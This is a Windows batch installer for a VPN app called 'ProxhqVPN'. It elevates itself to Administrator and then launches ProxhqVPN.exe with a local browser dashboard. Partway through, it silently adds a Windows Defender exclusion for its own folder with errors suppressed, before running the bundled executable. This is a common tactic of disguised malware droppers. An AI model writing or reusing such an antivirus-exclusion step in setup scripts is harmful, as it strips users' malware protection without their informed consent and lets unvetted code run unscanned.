@echo off
:: ════════════════════════════════════════════════════════════════════════════
::  ProxhqVPN — Easy Setup for Windows
::  Run this if you downloaded the zip manually.
::
::  HOW TO USE:
::    1. Extract the zip
::    2. Double-click this file  (or right-click → Run as Administrator)
::
::  ProxhqVPN will start and open in your browser automatically.
:: ════════════════════════════════════════════════════════════════════════════

cls
echo.
echo   +----------------------------------------------+
echo   ^|       PROXHQVPN - EASY SETUP             ^|
echo   +----------------------------------------------+
echo.

:: ── Check for Administrator rights ──────────────────────────────────────────
net session >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo   ProxhqVPN works best with Administrator rights.
    echo   Restarting as Administrator...
    echo.
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ── Locate ProxhqVPN executable ───────────────────────────────────────────────
set "DIR=%~dp0"
set "EXE=%DIR%ProxhqVPN.exe"

if not exist "%EXE%" (
    echo   [ERROR] ProxhqVPN.exe not found in %DIR%
    echo.
    echo   Make sure you extracted the zip fully before running setup.
    echo.
    pause
    exit /b 1
)

echo   [OK] ProxhqVPN found at: %EXE%

:: ── Find an open port ────────────────────────────────────────────────────────
set PORT=7474
netstat -an | findstr ":7474 " | findstr "LISTENING" >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    set PORT=7475
    echo   [!] Port 7474 in use, switching to 7475
) else (
    echo   [OK] Port 7474 is available
)

:: ── Windows Defender exclusion ───────────────────────────────────────────────
echo   Adding Windows Defender exclusion...
powershell -Command "Add-MpPreference -ExclusionPath '%DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
echo   [OK] Defender exclusion added

:: ── Ready ────────────────────────────────────────────────────────────────────
echo.
echo   ProxhqVPN is ready to start.
echo.
echo   Dashboard:  http://localhost:%PORT%
echo   Location:   %DIR%
echo.
echo   The browser will open automatically in a few seconds.
echo   Close this window to stop ProxhqVPN.
echo.

:: ── Open browser after 3 seconds ────────────────────────────────────────────
start "" /b cmd /c "timeout /t 3 /nobreak >nul && start http://localhost:%PORT%"

:: ── Launch ───────────────────────────────────────────────────────────────────
set PORT=%PORT%
"%EXE%"

echo.
echo   ProxhqVPN has stopped.
pause
